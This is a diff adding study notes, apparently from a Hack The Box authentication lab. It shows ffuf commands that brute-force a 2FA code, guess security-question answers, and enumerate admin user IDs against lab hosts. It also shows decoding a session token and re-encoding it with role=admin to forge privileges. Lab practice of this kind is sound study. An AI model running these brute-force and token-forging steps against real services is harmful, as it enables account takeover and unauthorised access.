@@ -80,6 +80,28 @@ ffuf -w ./tokens.txt -u http://weak_reset.htb/reset_password.php?token=FUZZ -fr 
 ```
 
 ```bash
-
+seq -w 0 9999 > tokens.txt
+ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code"
 ```
 
+```bash
+cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt
+ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."
+
+cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt
+
+// rewrite the response to 200 OK
+
+ffuf -w user_ids.txt -u http://154.57.164.67:32662/admin.php?user_id=FUZZ -fr "Could not load admin data."
+```
+
+```bash
+// Predictable tokens
+
+echo -n dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy | base64 -d
+
+user=htb-stdnt;role=user
+
+echo -n '757365723d6874622d7374646e743b726f6c653d75736572' | xxd -r -p
+echo -n 'user=htb-stdnt;role=admin' | xxd -p
+```
